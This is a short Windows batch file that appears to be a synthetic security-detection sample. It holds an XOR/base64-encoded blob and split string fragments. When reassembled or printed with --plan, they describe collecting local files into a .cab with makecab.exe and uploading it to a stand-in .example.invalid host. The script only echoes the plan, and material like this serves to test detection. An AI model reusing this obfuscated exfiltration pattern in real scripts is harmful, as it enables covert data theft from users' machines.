@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|xor_5a
rem HUNTRESS-MATERIAL:LGdrJikuPyopZzY1OTsuPwU2NTk7NnYqKD8qOyg/BS4oOzQpPD8odi8qNjU7PgUoPzc1Lj8mOz47Ki4/KGc3OzE/OTs4dD8iPyYpLjs9PwU5NS80LmdrJj0oOyoyZz4zOzc1ND4mND8iLgU2OzQ9Lzs9P2c0NTQ/Jjk7Nyo7Mz00BTM+Zzk7Nyo7Mz00dzxvbGI8PmNva2kmKTUvKDk/BSo7LjJnGWAGDyk/KCkGCi84NjM5BhIvNC4oPykpFjs4Bjk1NjY/OS53PG9sYjw+Y29raXQ5OzgmLyo2NTs+BS8oNmcyLi4qKWB1dTxvbGI8PmNva2l0PyI7Nyo2P3QzNCw7NjM+dS8qNjU7Pg==
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makec"
set "FrAg1=ab.exe|stage_count=1|graph=diamond|next_language=none|campaign_id=c"
set "FrAg2=ampaign-f568fd9513|source_path=C:\Users\Public\HuntressLab\collect-"
set "FrAg3=f568fd9513.cab|upload_url=https://f568fd9513.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=5544b1f3"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY call set "ReCoVeReD=%%FrAg0%%%%FrAg1%%%%FrAg2%%%%FrAg3%%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo makecab.exe upload C:\Users\Public\HuntressLab\collect-f568fd9513.cab to https://f568fd9513.example.invalid/upload
exit /b 0
